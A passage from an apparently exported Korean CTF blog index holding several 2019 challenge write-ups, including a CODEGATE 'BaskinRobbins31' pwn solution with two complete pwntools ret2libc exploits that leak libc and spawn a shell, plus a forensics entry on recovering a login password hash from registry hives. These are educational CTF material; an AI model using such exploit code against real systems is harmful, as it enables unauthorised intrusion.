}","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"디미고 TRUST CTF 2019 1등","slug":"trust1st","date":"2019-02-14T16:00:00.000Z","updated":"2019-05-22T07:38:58.101Z","comments":true,"path":"2019/02/15/trust1st/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/15/trust1st/","excerpt":"","text":"대회 후기 [1등!!!] 낮 12시부터 시작해서 자정까지 총 12시간동안 진행하는 디미고 CTF 대회였다. 좀 아쉬웠던 부분이라고 하면 포너블 문제가 죄다 막혀서 하나도 못 풀었다...아직 내공이 더 필요한 거 같다. 참여한 팀원들 모두 고생했고 또 있을 대회에 상위권으로 들 수 있도록 화이팅!","categories":[{"name":"Daily","slug":"Daily","permalink":"http://j0n9hyun.github.io/categories/Daily/"}],"tags":[]},{"title":"CODEGATE 2018 BaskinRobbins31","slug":"baskinrobbins31","date":"2019-02-05T03:42:00.000Z","updated":"2019-05-22T14:04:55.915Z","comments":true,"path":"2019/02/05/baskinrobbins31/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/05/baskinrobbins31/","excerpt":"","text":"BaskinRobbins31 Binary File [사진 1-1] 우리가 아는 그 베라 게임이다. 하지만 일반적인 방법으로는 이길 수 없다. [사진 1-2] 필승법으로 이겨보려 하지만 치트를 쓴다. 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r = process('./baskin')e = ELF('./baskin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')puts_offset = libc.symbols['puts']system_offset = libc.symbols['system']binsh_offset = libc.search('/bin/sh').next()your_turn = e.symbols['your_turn']puts_plt = e.plt['puts']puts_got = e.got['puts']pr = 0x400bc3payload = \"\"payload += \"\\x90\"*184payload += p64(pr)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(your_turn)r.sendline(payload)r.recvuntil(\"...:(\")r.recvline()leaked = u64(r.recv(6).ljust(8, \"\\x00\"))libc_base = leaked - puts_offsetsystem_addr = libc_base + system_offsetbinsh_addr = libc_base + binsh_offsetpayload2 = \"\"payload2 += \"\\x90\"*184payload2 += p64(pr)payload2 += p64(binsh_addr)payload2 += p64(system_addr)r.sendlineafter(\"(1-3)\", payload2)r.recvlines(4)r.interactive() [Exploit Code] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *r = process('./baskin')e = ELF('./baskin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')puts_offset = libc.symbols['puts']system_offset = libc.symbols['system']binsh_offset = libc.search('/bin/sh').next()your_turn = e.symbols['your_turn']puts_plt = e.plt['puts']puts_got = e.got['puts']pr = 0x400bc3def leak(): global leaked payload = \"\" payload += \"\\x90\"*184 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(your_turn) r.sendline(payload) r.recvuntil(\"...:(\") r.recvline() leaked = u64(r.recv(6).ljust(8, \"\\x00\"))def offset(): global system_addr, binsh_addr libc_base = leaked - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offsetdef exploit(): payload2 = \"\" payload2 += \"\\x90\"*184 payload2 += p64(pr) payload2 += p64(binsh_addr) payload2 += p64(system_addr) r.sendlineafter(\"(1-3)\", payload2) r.recvlines(4) r.interactive()if __name__ == \"__main__\": leak() offset() exploit() [Exploit Code #2] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Easy_Forensics (1)","slug":"easy_forensics1","date":"2019-02-01T16:00:00.000Z","updated":"2019-05-22T14:03:02.934Z","comments":true,"path":"2019/02/02/easy_forensics1/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/02/easy_forensics1/","excerpt":"","text":"Easy_Forensics (1) [시작 화면] 2.2G 용량의 윈도우7 가상머신 파일이 있다. 시작하면 로그인 화면에서 암호를 입력해야 하기 때문에 진입을 못한다. 이 암호가 무엇인지 알아내면 정답이다. [vmdk 파일 추출] 그러려면 우선 vm파일을 추출하는 과정이 필요한데 FTK Imager를 이용하면 추출이 가능하다. 내용물 전부 추출할 필요는 없다 하이브 파일이 들어있는 폴더만 가져온다. [Registry Analysis Tool] 이후 레지스트리 분석 도구를 이용해 사용자 계정 정보를 확인한다. 3번째에 있는 nolja 계정에 Secret 이름이 있는 것을 보면 우리가 원하는 정보는 이것임을 알 수 있다. 계정 정보에는 NT해쉬도 같이 저장되는데 이 NT해쉬가 바로 암호를 말하는 것이다. [복호화 성공!] 암호를 입력하면 환영합니다 메세지를 볼 수 있을 것이다. flag{st4rt} img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Foren","slug":"WriteUps/Foren","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Foren/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Secret_code_from","slug":"secret_code_from","date":"2019-01-31T11:27:00.000Z","updated":"2019-05-22T14:03:29.065Z","comments":true,"path":"2019/01/31/secret_code_from/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/31/secret_code_from/","excerpt":"","text":"Secret_code_from [워드 파일] 워드 파일이 하나 주어진다. 열어보면 무언가 써있는데 축소해서 보면 확인할 수 있다. 보는 시야를 달리하면 쉽게 풀 수 있었던 문제! flag{can_you_see_me?} img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 선물문제","slug":"present","date":"2019-01-30T14:10:00.000Z","updated":"2019-05-22T14:03:07.763Z","comments":true,"path":"2019/01/30/present/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/present/","excerpt":"","text":"선물문제(저놈 잡아라) [문제 이미지] 해당 사진을 보고 버스번호와 건물명을 맞추는 문제이다. 버스 노선 검색 결과, 급행버스이고 남양주시 -> 강남역(종착)을 향하는 버스번호는 1700 하나뿐이다. 헤맨 이유는 도로명 때문이었는데 이것 때문에 손 브루트포싱(?)을 좀 많이 했다. '점X밀X노'인 줄 알고 계속 넣었는데 안 되길래 다시 검색해본 결과, 다른 건물이었다(...) [길찾기 서비스로 확인한 결과] 건물이름 하고 우측에도 흰 공백이 더 있더라니 '점X밀X노'는 함정이었다. 이런! Flag : SPAO_1700 img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Goback","slug":"goback","date":"2019-01-30T11:01:00.000Z","updated":"2019-05-22T14:03:21.100Z","comments":true,"path":"2019/01/30/goback/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/goback/","excerpt":"","text":"Goback [문제 파일] 3개의 파일이 주어져있다. hwp은 한글파일의 확장자이다. 한글을 통해서 열어보자. [hwp 파일 내용] 끝에 보면 하트 모양 그림이 있는데 플래그의 냄새가 솔솔 난다. (근데 대회 진행 중에 봤을 땐 이 그림을 못 봤던 거 같은데 기분 탓인가?) 좌우간 해당 이미지를 다운로드 받아보자 파일 - 문서 정보를 들어가면 이미지 추출이 가능하다.(단축키는 Ctrl + Q + I) 파일을 열어보면 깨져서 나온다. Hxd로 확인해보자. 시그니처는 이상 없고 Ctrl + F로 플래그를 검색해보니 최하단에서 플래그를 확인할 수 있다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Base64","slug":"base64","date":"2019-01-30T06:00:28.000Z","updated":"2019-05-22T14:03:39.083Z","comments":true,"path":"2019/01/30/base64/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/base64/","excerpt":"","text":"Base64 디코딩을 3번 하면 풀리는 문제다. 12345671 from pwn import *2 import base643 r = remote('35.237.96.115', 1357)4 for i in range(3):5 result = base64.decodestring(r.recvline())6 r.sendlineafter(\": \", result)7 r.interactive() 근데 더 줄일 수도 있다! 사실 위 코드 또한 import base64를 제외해도 pwntools 안에 base64 모듈이 내장돼 있기 때문에 정상적으로 작동이 된다. b64d는 pwntools에서 사용할 수 있는 함수다. 기능은 decodestring과 동일하다. 1234561 from pwn import *2 r = remote('35.237.96.115', 1357)3 for i in range(3):4 result = b64d(r.recvline())5 r.sendlineafter(\": \", result)6 r.interactive()","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Solidity","slug":"solidity","date":"2019-01-30T05:47:28.000Z","updated":"2019-05-22T14:03:45.092Z","comments":true,"path":"2019/01/30/solidity/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/solidity/","excerpt":"","text":"Solidity 문제에 Ropsten 주소가 주어진다. 0x74b841a9d926db89b2cfeef454a75d178feda06f 이 주소를 기반으로 거래내역을 살펴보면 위와 같이 나타난다. 거래내역을 하나하나 살펴보면 플래그가 입력되어 있는 것을 볼 수 있다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]}]}